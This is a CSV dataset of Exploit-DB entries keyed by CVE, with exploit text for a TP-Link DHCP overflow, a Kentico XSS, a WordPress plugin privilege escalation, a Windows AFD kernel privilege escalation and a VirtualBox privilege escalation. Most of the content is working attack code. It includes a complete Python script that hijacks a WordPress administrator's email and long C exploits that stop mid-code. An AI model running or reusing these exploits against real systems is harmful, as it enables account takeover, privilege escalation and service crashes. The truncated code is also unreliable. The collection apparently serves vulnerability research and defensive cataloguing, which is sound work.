cve,timestamp,source,text
CVE-2024-11237,2025-05-13,exploit db,* Exploit Title: TP-Link VN020 F3v(T) TT_V6.2.1021) - DHCP Stack Buffer Overflow * Date: 10/20/2024 * Exploit Author: Mohamed Maatallah * Vendor Homepage: https://www.tp-link.com * Version: TT_V6.2.1021 (VN020-F3v(T)) * Tested on: VN020-F3v(T) Router (Hardware Version 1.0) * CVE: CVE-2024-11237 * Category: Remote * Technical Details: * - Triggers multiple memory corruption vectors in DHCP parsing * - Primary vector: Stack overflow via oversized hostname (127 bytes) * - Secondary vector: Parser confusion via malformed length fields * - Tertiary vector: Vendor specific option parsing edge case * Attack Surface: * - DHCP service running on port 67 * - Processes broadcast DISCOVER packets * - No authentication required * - Affects all routers running VN020 F3v(t) specifically the ones * supplied by Tunisie Telecom & Topnet * Exploitation Method: * 1. Sends crafted DHCP DISCOVER packet * 2. Overflows hostname buffer (64 -> 127 bytes) * 3. Corrupts length fields in DHCP options * 4. Success = No response (service crash) * Build: * Windows: cl
CVE-2025-32370,2025-05-13,exploit db,# Exploit Title: Kentico Xperience 13.0.178 - Cross Site Scripting (XSS) # Date: 2025-05-09 # Version: Kentico Xperience before 13.0.178 # Exploit Author: Alex Messham # Contact: ramessham@gmail.com # Source: https://github.com/xirtam2669/Kentico-Xperience-before-13.0.178---XSS-
CVE-2025-3605,2025-05-13,exploit db,"# Exploit Title: WordPress Frontend Login and Registration Blocks Plugin 1.0.7 - Privilege Escalation # Google Dork: inurl:/wp-content/plugins/frontend-login-and-registration-blocks/ # Date: 2025-05-12 # Exploit Author: Md Shoriful Islam (RootHarpy) # Vendor Homepage: https://wordpress.org/plugins/frontend-login-and-registration-blocks/ # Software Link: https://downloads.wordpress.org/plugin/frontend-login-and-registration-blocks.1.0.7.zip # Version: <= 1.0.7 # Tested on: Ubuntu 22.04 + WordPress 6.5.2 # CVE : CVE-2025-3605 import requests import argparse import sys def display_banner(): banner = """""" | (__ \ V /| _|___/ / () / /|__ \___|_ \/ _ \ () |__ \ print(banner) def suppress_ssl_warnings(): requests.packages.urllib3.disable_warnings() def initialize_session(): new_session = requests.Session() new_session.verify = False new_session.headers.update({'User-Agent': ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36""}) return new_session def parse_input_args(): parser = argparse.ArgumentParser(description=""Exploit for Privilege Escalation in Frontend Login and Registration Plugin <= 1.0.7"") parser.add_argument(""--target"", ""-t"", required=True, help=""Target URL to exploit"") parser.add_argument(""--target_user"", ""-u"", default=""1"", help=""User ID for target (default: 1)"") parser.add_argument(""--new_email"", ""-e"", default=""example@gmail.com"", help=""Email to change to (default: example@gmail.com)"") return parser.parse_args() def generate_payload(user, email): return { 'action': 'flrblocksusersettingsupdatehandle', 'user_id': user, 'flr-blocks-email-update': email def execute_exploit(session, target_url, payload): try: return session.post(f""{target_url}/wp-admin/admin-ajax.php"", data=payload) except Exception as error: print(f""Request error: {error}"") sys.exit(1) def process_response(response): if response.status_code == 200 and response.text.strip() != ""0"": print(f""Exploit succeeded! Response: {response.text}"") print(""Next: Go to the Forgot Password page and reset the admin password using the new email!"") else: print(f""Exploit failed. HTTP Status: {response.status_code}, Response: {response.text}"") def run_exploit(): display_banner() suppress_ssl_warnings() args = parse_input_args() session = initialize_session() payload = generate_payload(args.target_user, args.new_email) response = execute_exploit(session, args.target, payload) process_response(response) if __name__ == ""__main__"": run_exploit()"
CVE-2024-38193,2025-05-09,exploit db,"# Exploit Title: Microsoft Windows 11 Pro 23H2 - Ancillary Function Driver for WinSock Privilege Escalation # Date: 2025-05-05 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # Tested on: Win x64 # CVE : CVE-2024-38193 #pragma once #include ""ntstatus.h"" #include ""Windows.h"" #include #pragma comment(lib, ""ntdll.lib"") #define HIDWORD(l) ((DWORD)(((DWORDLONG)(l)>>32)&0xFFFFFFFF)) #define LODWORD(l) ((DWORD)((DWORDLONG)(l))) #define AfdOpenPacket ""AfdOpenPacketXX"" #define AFD_DEVICE_NAME L""\\Device\\Afd"" #define LOCALHOST ""127.0.0.1"" #define IOCTL_AFD_BIND 0x12003LL #define IOCTL_AFD_LISTEN 0x1200BLL #define IOCTL_AFD_CONNECT 0x120BBLL #define IOCTL_AFD_GET_SOCK_NAME 0x1202FLL #define FSCTL_PIPE_PEEK 0x11400CLL #define FSCTL_PIPE_IMPERSONATE 0x11001CLL #define FSCTL_PIPE_INTERNAL_WRITE 0x119FF8 #define OBJ_CASE_INSENSITIVE 0x00000040 #define OBJ_INHERIT 0x00000002 #define FILE_OPEN_IF 0x3 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0) #define OFFSET_IN_TOKEN_VARIABLEPART 0x490 #define OFFSET_IN_TOKEN_TOKEN_PRIVILEGES 0x40 #define OFFSET_IN_TOKEN_PRIMARY_GROUP 0xA8 #define OFFSET_IN_TOKEN_DYNAMIC_PART 0xB0 #define OFFSET_IN_TOKEN_DEFAULT_DACL 0xB8 #define PREVIOUS_MODE_OFFSET 0x232 #define OFFSET_TO_ACTIVE_PROCESS_LINKS 0x448 #define OFFSET_TO_TOKEN 0x4b8 #define CURRENT_THREAD (HANDLE)0xFFFFFFFFFFFFFFFE typedef struct IO_STATUS_BLOCK union DWORD Status; PVOID Pointer; DWORD* Information; struct _SYSTEM_POWER_STATE_CONTEXT union struct ULONG Reserved1 : 8; //0x0 ULONG TargetSystemState : 4; //0x0 ULONG EffectiveSystemState : 4; //0x0 ULONG CurrentSystemState : 4; //0x0 ULONG IgnoreHibernationPath : 1; //0x0 ULONG PseudoTransition : 1; //0x0 ULONG KernelSoftReboot : 1; //0x0 ULONG DirectedDripsTransition : 1; //0x0 ULONG Reserved2 : 8; //0x0 ULONG ContextAsUlong; //0x0 union _POWER_STATE enum _SYSTEM_POWER_STATE SystemState; //0x0 enum _DEVICE_POWER_STATE DeviceState; //0x0 typedef struct _IO_STACK_LOCATION UCHAR MajorFunction; //0x0 UCHAR MinorFunction; //0x1 UCHAR Flags; //0x2 UCHAR Control; //0x3 union struct struct _IO_SECURITY_CONTEXT* SecurityContext; //0x8 ULONG Options; //0x10 USHORT FileAttributes; //0x18 USHORT ShareAccess; //0x1a ULONG EaLength; //0x20 } Create; //0x8 struct struct _IO_SECURITY_CONTEXT* SecurityContext; //0x8 ULONG Options; //0x10 USHORT Reserved; //0x18 USHORT ShareAccess; //0x1a struct _NAMED_PIPE_CREATE_PARAMETERS* Parameters; //0x20 } CreatePipe; //0x8 struct struct _IO_SECURITY_CONTEXT* SecurityContext; //0x8 ULONG Options; //0x10 USHORT Reserved; //0x18 USHORT ShareAccess; //0x1a struct _MAILSLOT_CREATE_PARAMETERS* Parameters; //0x20 } CreateMailslot; //0x8 struct ULONG Length; //0x8 ULONG Key; //0x10 ULONG Flags; //0x14 union _LARGE_INTEGER ByteOffset; //0x18 } Read; //0x8 struct ULONG Length; //0x8 ULONG Key; //0x10 ULONG Flags; //0x14 union _LARGE_INTEGER ByteOffset; //0x18 } Write; //0x8 struct ULONG Length; //0x8 struct _UNICODE_STRING* FileName; //0x10 enum _FILE_INFORMATION_CLASS FileInformationClass; //0x18 ULONG FileIndex; //0x20 } QueryDirectory; //0x8 struct ULONG Length; //0x8 ULONG CompletionFilter; //0x10 } NotifyDirectory; //0x8 struct ULONG Length; //0x8 ULONG CompletionFilter; //0x10 enum _DIRECTORY_NOTIFY_INFORMATION_CLASS DirectoryNotifyInformationClass; //0x18 } NotifyDirectoryEx; //0x8 struct ULONG Length; //0x8 enum _FILE_INFORMATION_CLASS FileInformationClass; //0x10 } QueryFile; //0x8 struct ULONG Length; //0x8 enum _FILE_INFORMATION_CLASS FileInformationClass; //0x10 struct _FILE_OBJECT* FileObject; //0x18 union struct UCHAR ReplaceIfExists; //0x20 UCHAR AdvanceOnly; //0x21 ULONG ClusterCount; //0x20 VOID* DeleteHandle; //0x20 } SetFile; //0x8 struct ULONG Length; //0x8 VOID* EaList; //0x10 ULONG EaListLength; //0x18 ULONG EaIndex; //0x20 } QueryEa; //0x8 struct ULONG Length; //0x8 } SetEa; //0x8 struct ULONG Length; //0x8 enum _FSINFOCLASS FsInformationClass; //0x10 } QueryVolume; //0x8 struct ULONG Length; //0x8 enum _FSINFOCLASS FsInformationClass; //0x10 } SetVolume; //0x8 struct ULONG OutputBufferLength; //0x8 ULONG InputBufferLength; //0x10 ULONG FsControlCode; //0x18 VOID* Type3InputBuffer; //0x20 } FileSystemControl; //0x8 struct union _LARGE_INTEGER* Length; //0x8 ULONG Key; //0x10 union _LARGE_INTEGER ByteOffset; //0x18 } LockControl; //0x8 struct ULONG OutputBufferLength; //0x8 ULONG InputBufferLength; //0x10 ULONG IoControlCode; //0x18 VOID* Type3InputBuffer; //0x20 } DeviceIoControl; //0x8 struct ULONG SecurityInformation; //0x8 ULONG Length; //0x10 } QuerySecurity; //0x8 struct ULONG SecurityInformation; //0x8 VOID* SecurityDescriptor; //0x10 } SetSecurity; //0x8 struct struct _VPB* Vpb; //0x8 struct _DEVICE_OBJECT* DeviceObject; //0x10 } MountVolume; //0x8 struct struct _VPB* Vpb; //0x8 struct _DEVICE_OBJECT* DeviceObject; //0x10 } VerifyVolume; //0x8 struct struct _SCSI_REQUEST_BLOCK* Srb; //0x8 } Scsi; //0x8 struct ULONG Length; //0x8 VOID* StartSid; //0x10 struct _FILE_GET_QUOTA_INFORMATION* SidList; //0x18 ULONG SidListLength; //0x20 } QueryQuota; //0x8 struct ULONG Length; //0x8 } SetQuota; //0x8 struct enum _DEVICE_RELATION_TYPE Type; //0x8 } QueryDeviceRelations; //0x8 struct struct _GUID* InterfaceType; //0x8 USHORT Size; //0x10 USHORT Version; //0x12 struct _INTERFACE* Interface; //0x18 VOID* InterfaceSpecificData; //0x20 } QueryInterface; //0x8 struct struct _DEVICE_CAPABILITIES* Capabilities; //0x8 } DeviceCapabilities; //0x8 struct struct _IO_RESOURCE_REQUIREMENTS_LIST* IoResourceRequirementList; //0x8 } FilterResourceRequirements; //0x8 struct ULONG WhichSpace; //0x8 VOID* Buffer; //0x10 ULONG Offset; //0x18 ULONG Length; //0x20 } ReadWriteConfig; //0x8 struct UCHAR Lock; //0x8 } SetLock; //0x8 struct enum BUS_QUERY_ID_TYPE IdType; //0x8 } QueryId; //0x8 struct enum DEVICE_TEXT_TYPE DeviceTextType; //0x8 ULONG LocaleId; //0x10 } QueryDeviceText; //0x8 struct UCHAR InPath; //0x8 UCHAR Reserved[3]; //0x9 enum _DEVICE_USAGE_NOTIFICATION_TYPE Type; //0x10 } UsageNotification; //0x8 struct enum _SYSTEM_POWER_STATE PowerState; //0x8 } WaitWake; //0x8 struct struct _POWER_SEQUENCE* PowerSequence; //0x8 } PowerSequence; //0x8 struct union ULONG SystemContext; //0x8 struct _SYSTEM_POWER_STATE_CONTEXT SystemPowerStateContext; enum _POWER_STATE_TYPE Type; //0x10 union _POWER_STATE State; //0x18 enum POWER_ACTION ShutdownType; //0x20 } Power; //0x8 struct struct _CM_RESOURCE_LIST* AllocatedResources; //0x8 struct _CM_RESOURCE_LIST* AllocatedResourcesTranslated; //0x10 } StartDevice; //0x8 struct ULONGLONG ProviderId; //0x8 VOID* DataPath; //0x10 ULONG BufferSize; //0x18 VOID* Buffer; //0x20 } WMI; //0x8 struct VOID* Argument1; //0x8 VOID* Argument2; //0x10 VOID* Argument3; //0x18 VOID* Argument4; //0x20 } Others; //0x8 } Parameters; //0x8 struct _DEVICE_OBJECT* DeviceObject; //0x28 struct _FILE_OBJECT* FileObject; //0x30 LONG(*CompletionRoutine)(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2, VOID* arg3); //0x38 VOID* Context; //0x40 }IO_STACK_LOCATION; struct _KDEVICE_QUEUE_ENTRY struct _LIST_ENTRY DeviceListEntry; //0x0 ULONG SortKey; //0x10 UCHAR Inserted; //0x14 struct _KAPC UCHAR Type; //0x0 UCHAR AllFlags; //0x1 UCHAR Size; //0x2 UCHAR SpareByte1; //0x3 ULONG SpareLong0; //0x4 struct _KTHREAD* Thread; //0x8 struct _LIST_ENTRY ApcListEntry; //0x10 VOID* Reserved[3]; //0x20 VOID* NormalContext; //0x38 VOID* SystemArgument1; //0x40 VOID* SystemArgument2; //0x48 CHAR ApcStateIndex; //0x50 CHAR ApcMode; //0x51 UCHAR Inserted; //0x52 struct _IRP SHORT Type; //0x0 USHORT Size; //0x2 USHORT AllocationProcessorNumber; //0x4 USHORT Reserved; //0x6 struct _MDL* MdlAddress; //0x8 ULONG Flags; //0x10 union struct _IRP* MasterIrp; //0x18 LONG IrpCount; //0x18 VOID* SystemBuffer; //0x18 } AssociatedIrp; //0x18 struct _LIST_ENTRY ThreadListEntry; //0x20 struct IO_STATUS_BLOCK IoStatus; //0x30 CHAR RequestorMode; //0x40 UCHAR PendingReturned; //0x41 CHAR StackCount; //0x42 CHAR CurrentLocation; //0x43 UCHAR Cancel; //0x44 UCHAR CancelIrql; //0x45 CHAR ApcEnvironment; //0x46 UCHAR AllocationFlags; //0x47 union struct _IO_STATUS_BLOCK* UserIosb; //0x48 VOID* IoRingContext; //0x48 struct _KEVENT* UserEvent; //0x50 union struct union VOID(*UserApcRoutine)(VOID* arg1, struct _IO_STATUS_BLOCK* arg2, ULONG arg3); //0x58 VOID* IssuingProcess; //0x58 union VOID* UserApcContext; //0x60 struct _IORING_OBJECT* IoRing; //0x60 } AsynchronousParameters; //0x58 union _LARGE_INTEGER AllocationSize; //0x58 } Overlay; //0x58 VOID(*CancelRoutine)(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2); VOID* UserBuffer; //0x70 union struct union struct _KDEVICE_QUEUE_ENTRY DeviceQueueEntry; //0x78 VOID* DriverContext[4]; //0x78 struct _ETHREAD* Thread; //0x98 CHAR* AuxiliaryBuffer; //0xa0 struct _LIST_ENTRY ListEntry; //0xa8 union struct _IO_STACK_LOCATION* CurrentStackLocation; //0xb8 ULONG PacketType; //0xb8 struct _FILE_OBJECT* OriginalFileObject; //0xc0 VOID* IrpExtension; //0xc8 } Overlay; //0x78 struct _KAPC Apc; //0x78 VOID* CompletionKey; //0x78 } Tail; //0x78 typedef struct _TA_ADDRESS USHORT AddressLength; USHORT AddressType; UCHAR Address[1]; }TA_ADDRESS; typedef struct _TRANSPORT_ADDRESS LONG TAAddressCount; TA_ADDRESS Address[1]; }TRANSPORT_ADDRESS; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; }OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _SYSTEM_MODULE_ENTRY HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256]; } SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY; typedef struct _SYSTEM_MODULE_INFORMATION ULONG Count; SYSTEM_MODULE_ENTRY Module[1]; } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION; typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX PVOID Object; ULONG_PTR UniqueProcessId; ULONG_PTR HandleValue; ULONG GrantedAccess; USHORT CreatorBackTraceIndex; USHORT ObjectTypeIndex; ULONG HandleAttributes; ULONG Reserved; } SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX; typedef struct _SYSTEM_HANDLE_INFORMATION_EX ULONG_PTR NumberOfHandles; ULONG_PTR Reserved; SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1]; } SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX; typedef struct _AFD_CREATE_PACKET { ULONG NextEntryOffset; WORD Flags; UCHAR EaNameLength; USHORT EaValueLength; CHAR EaName[15]; ULONG EndpointFlags; ULONG GroupID; ULONG AddressFamily; ULONG SocketType; ULONG Protocol; ULONG SizeOfTransportName; wchar_t TransportName[16]; } AFD_CREATE_PACKET; enum THREADINFOCLASS { ThreadImpersonationToken = 5 }; enum SYSTEM_INFORMATION_CLASS { SystemModuleInformation = 11, SystemExtendedHandleInformation = 64 typedef enum EVENT_TYPE { NotificationEvent, SynchronizationEvent typedef struct _AFD_BIND_DATA { ULONG ShareType; SOCKADDR_IN addr; } AFD_BIND_DATA, * PAFD_BIND_DATA; typedef struct alignas(16) MY_AFD_CONNECT_INFO __int64 UseSan; __int64 hNtSock1; __int64 Unknown; __int32 tmp6; WORD const_16; sockaddr_in bind; typedef struct FAKE_DATA_ENTRY_QUEUE DWORD tmp; LIST_ENTRY nextQueue; __int64 unknown; PVOID security_client_context; __int64 unknown2; __int64 sizeOfData; char DATA[0x77FD0]; typedef struct _AFD_LISTEN_INFO { ULONG unknown; __int64 MaximumConnectionQueue; } AFD_LISTEN_INFO, * PAFD_LISTEN_INFO; typedef struct _SECURITY_CLIENT_CONTEXT _SECURITY_QUALITY_OF_SERVICE SecurityQos; void* ClientToken; unsigned __int8 DirectlyAccessClientToken; unsigned __int8 DirectAccessEffectiveOnly; unsigned __int8 ServerIsRemote; _TOKEN_CONTROL ClientTokenControl; }SECURITY_CLIENT_CONTEXT, * PSECURITY_CLIENT_CONTEXT; struct __declspec(align(8)) _OWNER_ENTRY unsigned __int64 OwnerThread; DWORD ___u1; typedef struct _ERESOURCE struct _LIST_ENTRY SystemResourcesList; //0x0 struct _OWNER_ENTRY* OwnerTable; //0x10 SHORT ActiveCount; //0x18 union USHORT Flag; //0x1a struct UCHAR ReservedLowFlags; //0x1a UCHAR WaiterPriority; //0x1b VOID* SharedWaiters; //0x20 VOID* ExclusiveWaiters; //0x28 struct _OWNER_ENTRY OwnerEntry; //0x30 ULONG ActiveEntries; //0x40 ULONG ContentionCount; //0x44 ULONG NumberOfSharedWaiters; //0x48 ULONG NumberOfExclusiveWaiters; //0x4c VOID* Reserved2; //0x50 union VOID* Address; //0x58 ULONGLONG CreatorBackTraceIndex; //0x58 ULONGLONG SpinLock; //0x60 }ERESOURCE, *PERESOURCE; typedef struct _EX_PUSH_LOCK union struct ULONGLONG Locked : 1; //0x0 ULONGLONG Waiting : 1; //0x0 ULONGLONG Waking : 1; //0x0 ULONGLONG MultipleShared : 1; //0x0 ULONGLONG Shared : 60; //0x0 ULONGLONG Value; //0x0 VOID* Ptr; //0x0 typedef struct _SEP_CACHED_HANDLES_TABLE struct _EX_PUSH_LOCK Lock; //0x0 struct _RTL_DYNAMIC_HASH_TABLE* HashTable; //0x8 typedef struct _EX_RUNDOWN_REF union ULONGLONG Count; //0x0 VOID* Ptr; //0x0 typedef struct _OB_HANDLE_REVOCATION_BLOCK struct _LIST_ENTRY RevocationInfos; //0x0 struct _EX_PUSH_LOCK Lock; //0x10 struct _EX_RUNDOWN_REF Rundown; //0x18 typedef struct _SEP_LOGON_SESSION_REFERENCES struct _SEP_LOGON_SESSION_REFERENCES* Next; //0x0 struct _LUID LogonId; //0x8 struct _LUID BuddyLogonId; //0x10 LONGLONG ReferenceCount; //0x18 ULONG Flags; //0x20 struct _DEVICE_MAP* pDeviceMap; //0x28 VOID* Token; //0x30 struct _UNICODE_STRING AccountName; //0x38 struct _UNICODE_STRING AuthorityName; //0x48 struct _SEP_CACHED_HANDLES_TABLE CachedHandlesTable; //0x58 struct _EX_PUSH_LOCK SharedDataLock; //0x68 struct _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION* SharedClaimAttributes; struct _SEP_SID_VALUES_BLOCK* SharedSidValues; //0x78 struct _OB_HANDLE_REVOCATION_BLOCK RevocationBlock; //0x80 struct _EJOB* ServerSilo; //0xa0 struct _LUID SiblingAuthId; //0xa8 struct _LIST_ENTRY TokenList; //0xb0 typedef struct _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION ULONG SecurityAttributeCount; //0x0 struct _LIST_ENTRY SecurityAttributesList; //0x8 ULONG WorkingSecurityAttributeCount; //0x18 struct _LIST_ENTRY WorkingSecurityAttributesList; //0x20 }AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION; typedef struct _SEP_SID_VALUES_BLOCK ULONG BlockLength; //0x0 LONGLONG ReferenceCount; //0x8 ULONG SidCount; //0x10 ULONGLONG SidValuesStart; //0x18 }SEP_SID_VALUES_BLOCK,*PSEP_SID_VALUES_BLOCK; struct _SEP_TOKEN_PRIVILEGES ULONGLONG Present; //0x0 ULONGLONG Enabled; //0x8 ULONGLONG EnabledByDefault; //0x10 struct _SEP_AUDIT_POLICY struct _TOKEN_AUDIT_POLICY AdtTokenPolicy; //0x0 UCHAR PolicySetStatus; //0x1e struct _TOKEN struct _TOKEN_SOURCE TokenSource; //0x0 struct _LUID TokenId; //0x10 struct _LUID AuthenticationId; //0x18 struct _LUID ParentTokenId; //0x20 union _LARGE_INTEGER ExpirationTime; //0x28 struct _ERESOURCE* TokenLock; //0x30 struct _LUID ModifiedId; //0x38 struct _SEP_TOKEN_PRIVILEGES Privileges; //0x40 struct _SEP_AUDIT_POLICY AuditPolicy; //0x58 ULONG SessionId; //0x78 ULONG UserAndGroupCount; //0x7c ULONG RestrictedSidCount; //0x80 ULONG VariableLength; //0x84 ULONG DynamicCharged; //0x88 ULONG DynamicAvailable; //0x8c ULONG DefaultOwnerIndex; //0x90 struct _SID_AND_ATTRIBUTES* UserAndGroups; //0x98 struct _SID_AND_ATTRIBUTES* RestrictedSids; //0xa0 VOID* PrimaryGroup; //0xa8 ULONG* DynamicPart; //0xb0 struct _ACL* DefaultDacl; //0xb8 enum _TOKEN_TYPE TokenType; //0xc0 enum _SECURITY_IMPERSONATION_LEVEL ImpersonationLevel; //0xc4 ULONG TokenFlags; //0xc8 UCHAR TokenInUse; //0xcc ULONG IntegrityLevelIndex; //0xd0 ULONG MandatoryPolicy; //0xd4 void* LogonSession; //0xd8 struct _LUID OriginatingLogonSession; //0xe0 struct _SID_AND_ATTRIBUTES_HASH SidHash; //0xe8 struct _SID_AND_ATTRIBUTES_HASH RestrictedSidHash; //0x1f8 struct _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION* pSecurityAttributes; //0x308 VOID* Package; //0x310 struct _SID_AND_ATTRIBUTES* Capabilities; //0x318 ULONG CapabilityCount; //0x320 struct _SID_AND_ATTRIBUTES_HASH CapabilitiesHash; //0x328 struct _SEP_LOWBOX_NUMBER_ENTRY* LowboxNumberEntry; //0x438 struct _SEP_CACHED_HANDLES_ENTRY* LowboxHandlesEntry; //0x440 struct _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION* pClaimAttributes; VOID* TrustLevelSid; //0x450 struct _TOKEN* TrustLinkedToken; //0x458 VOID* IntegrityLevelSidValue; //0x460 struct _SEP_SID_VALUES_BLOCK* TokenSidValues; //0x468 struct _SEP_LUID_TO_INDEX_MAP_ENTRY* IndexEntry; //0x470 struct _SEP_TOKEN_DIAG_TRACK_ENTRY* DiagnosticInfo; //0x478 struct _SEP_CACHED_HANDLES_ENTRY* BnoIsolationHandlesEntry; //0x480 VOID* SessionObject; //0x488 ULONGLONG VariablePart; //0x490 struct _OBJECT_HEADER LONGLONG PointerCount; //0x0 union LONGLONG HandleCount; //0x8 VOID* NextToFree; //0x8 struct _EX_PUSH_LOCK Lock; //0x10 UCHAR TypeIndex; //0x18 union UCHAR TraceFlags; //0x19 struct UCHAR DbgRefTrace : 1; //0x19 UCHAR DbgTracePermanent : 1; //0x19 UCHAR InfoMask; //0x1a union UCHAR Flags; //0x1b struct UCHAR NewObject : 1; //0x1b UCHAR KernelObject : 1; //0x1b UCHAR KernelOnlyAccess : 1; //0x1b UCHAR ExclusiveObject : 1; //0x1b UCHAR PermanentObject : 1; //0x1b UCHAR DefaultSecurityQuota : 1; //0x1b UCHAR SingleHandleEntry : 1; //0x1b UCHAR DeletedInline : 1; //0x1b ULONG Reserved; //0x1c union struct _OBJECT_CREATE_INFORMATION* ObjectCreateInfo; //0x20 VOID* QuotaBlockCharged; //0x20 VOID* SecurityDescriptor; //0x28 struct _TOKEN Body; //0x30 struct mm { void* fake_data_entry; void* input; _IRP* crafted_irp; IO_STACK_LOCATION *crafted_arbitrary_io_stack_location; void* p_mem_0x30; void* p_mem_0xD0_2; _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION* pSecurityAttributes; ACL* VariablePartDefaultDacl; ACL* VariablePartDefaultDacl2; _ERESOURCE* TokenLock; void* PrimaryGroup; int sizeOfClientTokenAndObjectHeader; PSEP_SID_VALUES_BLOCK TokenSidValues; _SECURITY_CLIENT_CONTEXT* security_client_context; _SEP_LOGON_SESSION_REFERENCES* LogonSession; _TOKEN* fakeToken; void *pipe_100_im_control_block; void* pipe_100_rw_control_block; void* p_mem_Pipe_hToPipe_1000_rw; void* p_mem_Pipe_hToPipe_1000_rw_2; HANDLE hPipeIM; HANDLE hPipeRW; HANDLE hFileIM; HANDLE hFileRW; HANDLE IncPrimitiveTOKEN; HANDLE RWPrimitiveTOKEN; struct _DISPATCHER_HEADER union volatile LONG Lock; //0x0 LONG LockNV; //0x0 struct UCHAR Type; //0x0 UCHAR Signalling; //0x1 UCHAR Size; //0x2 UCHAR Reserved1; //0x3 struct UCHAR TimerType; //0x0 union UCHAR TimerControlFlags; //0x1 struct UCHAR Absolute : 1;"
CVE-2024-21111,2025-05-09,exploit db,"# Exploit Title: VirtualBox 7.0.16 - Privilege Escalation # Date: 2025-05-06 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # Tested on: Win x64 # CVE : CVE-2024-21111 #include #include #include #include #include #include #include #include ""resource.h"" #include ""def.h"" #include ""FileOplock.h"" #pragma comment(lib, ""Msi.lib"") #pragma comment(lib, ""Shlwapi.lib"") #pragma comment(lib, ""wtsapi32"") #pragma comment(lib, ""PathCch.lib"") #pragma comment(lib, ""rpcrt4.lib"") #pragma warning(disable:4996) struct __declspec(uuid(""74AB5FFE-8726-4435-AA7E-876D705BCBA5"")) CLSID_VBoxSDS; FileOpLock* oplock; HANDLE hFile, vb11, h; HANDLE hthread; NTSTATUS retcode; HMODULE hm = GetModuleHandle(NULL); HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_RBS1), L""rbs""); DWORD RbsSize = SizeofResource(hm, res); void* RbsBuff = LoadResource(hm, res); WCHAR dir[MAX_PATH] = { 0x0 }; wchar_t filen[MAX_PATH] = { 0x0 }; DWORD WINAPI install(void*); BOOL Move(HANDLE hFile); void callback(); HANDLE getDirectoryHandle(LPWSTR file, DWORD access, DWORD share, DWORD dispostion); LPWSTR BuildPath(LPCWSTR path); void loadapis(); VOID cb1(); VOID cb0(); BOOL Monitor(HANDLE hDir); BOOL clearDataDir(); BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) { HANDLE hJunction; DWORD cb; wchar_t printname[] = L""""; HANDLE hDir; hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL); if (hDir == INVALID_HANDLE_VALUE) { printf(""[!] Failed to obtain handle on directory %ls.\n"", dir); return FALSE; SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR); SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR); SIZE_T PathLen = TargetLen + PrintnameLen + 12; SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)); PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize); Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT; Data->ReparseDataLength = PathLen; Data->Reserved = 0; Data->MountPointReparseBuffer.SubstituteNameOffset = 0; Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen; memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2); Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2); Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen; memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2); if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0) printf(""[+] Junction %ls -> %ls created!\n"", dir, target); free(Data); return TRUE; else printf(""[!] Error: %d. Exiting\n"", GetLastError()); free(Data); return FALSE; BOOL DeleteJunction(LPCWSTR path) { REPARSE_GUID_DATA_BUFFER buffer = { 0 }; BOOL ret; buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT; DWORD cb = 0; IO_STATUS_BLOCK io; HANDLE hDir; hDir = CreateFile(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_REPARSE_POINT, NULL); if (hDir == INVALID_HANDLE_VALUE) { printf(""[!] Failed to obtain handle on directory %ls.\n"", path); printf(""%d\n"", GetLastError()); return FALSE; ret = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL); if (ret == 0) { printf(""Error: 